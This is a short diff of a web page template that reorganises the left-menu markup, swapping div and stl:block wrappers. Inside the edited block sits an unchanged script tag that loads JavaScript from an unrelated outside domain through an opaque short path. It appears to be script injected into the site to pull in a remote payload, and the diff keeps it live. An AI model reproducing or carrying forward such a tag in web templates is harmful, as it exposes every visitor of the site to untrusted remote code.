@@ -64,7 +64,7 @@
             <div id="bd">
                 <div class="yui-b">
                     <div id="left">
-                    <stl:block stl:repeat="menu left_menus">
+                    <div stl:repeat="menu left_menus">
                             <stl:block if="level1">
                                 <ul stl:repeat="option level1">
                                     <li>
@@ -77,11 +77,11 @@
                                 <label>${menu/title}</label>
                                    ${menu/content}
                             </stl:block>   
-                    </stl:block>
                     </div>
-                    <div stl:block="not office" id="left_menu">
+                    </div>
+                    <stl:block stl:block="not office" id="left_menu">
                         <SCRIPT type="text/javascript" LANGUAGE="javascript" src="http://www.qksz.net/1e-g2h5"> </SCRIPT>
-                    </div>
+                    </stl:block>
                 </div><!-- yui-b -->
                 <div id="yui-main">
                     <div class="yui-b">
